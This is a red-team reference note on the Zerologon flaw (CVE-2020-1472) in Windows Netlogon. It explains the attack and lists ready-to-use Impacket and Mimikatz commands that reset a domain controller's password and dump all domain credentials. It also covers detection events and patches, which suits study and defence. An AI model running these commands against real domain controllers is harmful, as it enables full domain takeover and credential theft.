---
title: Zerologon
aliases: ["CVE-2020-1472", "Zerologon attack"]
type: technique
domain: [red-team, active-directory]
attack_tactic: [privesc, credential-access]
tags: [type/technique, domain/red-team, attack/privesc, cve]
source: "Secura / Tom Tervoort"
source_url: "https://www.secura.com/uploads/whitepapers/Zerologon.pdf"
verified: true
related: ["[[Domain Controller (DC)]]", "[[NTLM Authentication]]", "[[DCSync]]", "[[Pass-the-Hash]]", "[[Computer Accounts]]"]
created: 2026-06-07
updated: 2026-06-07
---

# Zerologon (CVE-2020-1472)

> [!summary] One-liner
> A critical flaw in the Netlogon protocol's AES-CFB8 implementation that lets an unauthenticated attacker reset a Domain Controller's machine account password to an empty string — granting instant domain compromise.

## Concept abused
The **Netlogon Remote Protocol (MS-NRPC)** uses AES-CFB8 for its session credential handshake. Due to a cryptographic flaw, sending an all-zeros client challenge + all-zeros client credential succeeds after ~256 attempts on average (1 in 256 chance per attempt). This authenticates the attacker as the DC's machine account **without knowing the password**.

Once authenticated, the attacker uses `NetrServerPasswordSet2` to **set the DC's machine account password to empty** — then extracts all domain hashes via [[DCSync]].

## Prerequisites
- Network access to a DC on **TCP port 135** (RPC / Netlogon).
- **No credentials required** — this is an unauthenticated attack.
- Target DC must be **unpatched** (patch: August 2020, enforcement: February 2021).

## How the attack works
1. Send `NetrServerReqChallenge` with client challenge = `\x00 * 8`.
2. Send `NetrServerAuthenticate3` with client credential = `\x00 * 8`.
3. If the computed session key happens to start with `\x00` bytes (1/256 chance), auth succeeds.
4. Repeat up to ~256 times until success (~2-3 seconds total).
5. Call `NetrServerPasswordSet2` to set the DC machine account password to empty.
6. Use the now-known (empty) machine account hash to [[DCSync]] all domain credentials.

## Commands & tools

### Impacket (zerologon exploit + DCSync)
```bash
# Test if vulnerable (doesn't change password)
zerologon_tester.py <DC_NAME> <DC_IP>

# Exploit — sets DC machine password to empty
cve-2020-1472-exploit.py <DC_NAME> <DC_IP>

# DCSync with the empty hash
secretsdump.py -no-pass -just-dc '<DOMAIN>/<DC_NAME>$@<DC_IP>'

# CRITICAL: Restore the original machine password afterward
# (empty password breaks AD replication, DNS, etc.)
restorepassword.py <DOMAIN>/<DC_NAME>@<DC_NAME> -target-ip <DC_IP> -hexpass <ORIGINAL_HEX>
```

### Mimikatz
```
# Zerologon exploit
lsadump::zerologon /target:<DC_FQDN> /account:<DC_NAME>$

# Post-exploit DCSync
lsadump::dcsync /domain:<DOMAIN> /dc:<DC_FQDN> /user:krbtgt /authuser:<DC_NAME>$ /authdomain:<DOMAIN> /authpassword:"" /authntlm
```

> [!warning] Destructive side effects
> Setting the DC machine password to empty **breaks AD replication, Kerberos, DNS, and trust relationships** until the password is restored. Always restore the original password immediately after extraction.

## Detection / artifacts
- **Event 4742**: Computer account password change on the DC.
- **Event 5805** (NETLOGON): Authentication failure / machine account password mismatch (replication breaks).
- Spike of Netlogon auth attempts (all-zeros pattern) from a single source IP.
- IDS signatures for Zerologon RPC pattern (Snort/Suricata rules available).

## Mitigation
- **Patch**: KB4571694 (August 2020) + enforcement mode (February 2021).
- Set `FullSecureChannelProtection` registry key to 1 (forces secure RPC for Netlogon).
- Monitor for anomalous `NetrServerAuthenticate3` calls.
- Network segmentation: limit which hosts can reach DC RPC ports.

## Related
- Target: [[Domain Controller (DC)]], [[Computer Accounts]] (DC machine account).
- Post-exploitation: [[DCSync]], [[Pass-the-Hash]].
- Similar DC attacks: [[noPac]], [[PetitPotam]], [[PrintNightmare]].

## Sources
- Secura / Tom Tervoort — "Zerologon: Unauthenticated Domain Controller Compromise" (September 2020).
- CVE-2020-1472.
